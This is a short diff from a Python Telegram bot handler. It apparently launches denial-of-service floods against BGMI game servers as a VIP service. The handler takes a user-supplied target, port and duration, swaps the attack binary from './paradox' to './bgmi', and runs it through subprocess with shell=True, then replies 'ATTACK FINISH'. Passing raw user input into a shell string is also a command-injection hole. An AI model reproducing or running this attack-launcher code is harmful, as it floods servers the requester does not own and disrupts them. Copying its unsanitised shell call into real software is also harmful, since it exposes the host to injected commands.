@@ -466,7 +466,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/op', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # @DABBAowner GRP # Call start_attack_reply function
-                full_command = f"./paradox {target} {port} {time} 9 900"
+                full_command = f"./bgmi {target} {port} {time} 900"
                 subprocess.run(full_command, shell=True)
                 response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══VIP_ViP═══"
         else:
